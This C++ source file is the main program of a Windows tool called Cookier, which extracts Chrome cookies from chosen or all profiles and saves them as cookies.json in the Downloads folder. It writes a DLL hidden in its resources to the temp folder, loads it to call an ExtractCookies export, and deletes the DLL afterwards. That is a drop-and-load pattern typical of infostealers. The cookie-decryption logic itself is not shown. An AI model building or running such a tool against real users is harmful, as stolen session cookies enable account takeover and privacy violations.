// main.cpp
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include "Cookier.h"

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

namespace fs = std::filesystem;

typedef bool (*ExtractCookiesFunc)(char**, const char*, bool);

static std::string Narrow(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string out(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), out.data(), n, nullptr, nullptr);
    return out;
}

int wmain(int argc, wchar_t* argv[]) {
    std::string browser = "";
    std::string outPath = "";
    std::string profileList = "Default";
    bool verbose = false;

    for (int i = 1; i < argc; ++i) {
        std::wstring arg = argv[i];
        if (arg == L"--help" || arg == L"-h") {
            std::cout << "Usage: Cookier.exe --browser chrome/all [--profile name1,name2/all] [--output file.json] [--verbose]\n";
            return 0;
        }
        if (arg == L"--browser" || arg == L"-b") {
            if (i + 1 < argc) { browser = Narrow(argv[++i]); }
        }
        if (arg == L"--profile" || arg == L"-p") {
            std::vector<std::string> profiles;
            int j = i + 1;
            while (j < argc && argv[j][0] != L'-') {
                profiles.push_back(Narrow(argv[j]));
                j++;
            }
            profileList = "";
            for (size_t k = 0; k < profiles.size(); ++k) {
                profileList += profiles[k] + (k == profiles.size() - 1 ? "" : ",");
            }
            i = j - 1;
        }
        if (arg == L"--output" || arg == L"-o") {
            if (i + 1 < argc) { outPath = Narrow(argv[++i]); }
        }
        if (arg == L"--verbose" || arg == L"-v") verbose = true;
    }

    if (browser.empty()) return 0;

    if (browser == "all") {
        std::cout << "[*] Extracting from all supported browsers...\n";
        browser = "chrome"; 
    }

    if (browser != "chrome") {
        std::cerr << "[!] Unsupported browser: " << browser << "\n";
        return 1;
    }

    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring dllPath = std::wstring(tempPath) + L"Cookier_Provider_Chrome_" + std::to_wstring(GetCurrentProcessId()) + L".dll";
    DeleteFileW(dllPath.c_str());

    HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(100), MAKEINTRESOURCEW(10));
    if (!hRes) {
        std::cerr << "[!] Failed to find embedded Chrome provider.\n";
        return 1;
    }

    HGLOBAL hMem = LoadResource(NULL, hRes);
    void* pData = LockResource(hMem);
    DWORD size = SizeofResource(NULL, hRes);

    std::ofstream out(dllPath, std::ios::binary);
    out.write((char*)pData, size);
    out.close();

    HMODULE hProvider = LoadLibraryW(dllPath.c_str());
    if (!hProvider) {
        std::cerr << "[!] Failed to load Chrome provider. Error: " << GetLastError() << "\n";
        return 1;
    }

    ExtractCookiesFunc extractFunc = (ExtractCookiesFunc)GetProcAddress(hProvider, "ExtractCookies");
    if (!extractFunc) {
        std::cerr << "[!] Failed to find ExtractCookies in provider.\n";
        FreeLibrary(hProvider);
        return 1;
    }

    std::cout << "[*] Extracting cookies from " << browser << " (Profiles: " << profileList << ")...\n";
    char* jsonResult = nullptr;
    if (extractFunc(&jsonResult, profileList.c_str(), verbose)) {
        if (outPath.empty()) {
            PWSTR downloadsPath = nullptr;
            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Downloads, 0, nullptr, &downloadsPath))) {
                outPath = Narrow(downloadsPath) + "\\cookies.json";
                CoTaskMemFree(downloadsPath);
            } else {
                outPath = "cookies.json";
            }
        }
        std::ofstream f(outPath);
        if (jsonResult) {
            f << jsonResult;
            CoTaskMemFree(jsonResult);
        }
        std::cout << "[+] Saved cookies to " << outPath << "\n";
    } else {
        std::cerr << "[!] Extraction failed.\n";
        FreeLibrary(hProvider);
        DeleteFileW(dllPath.c_str());
        return 1;
    }

    FreeLibrary(hProvider);
    DeleteFileW(dllPath.c_str());
    return 0;
}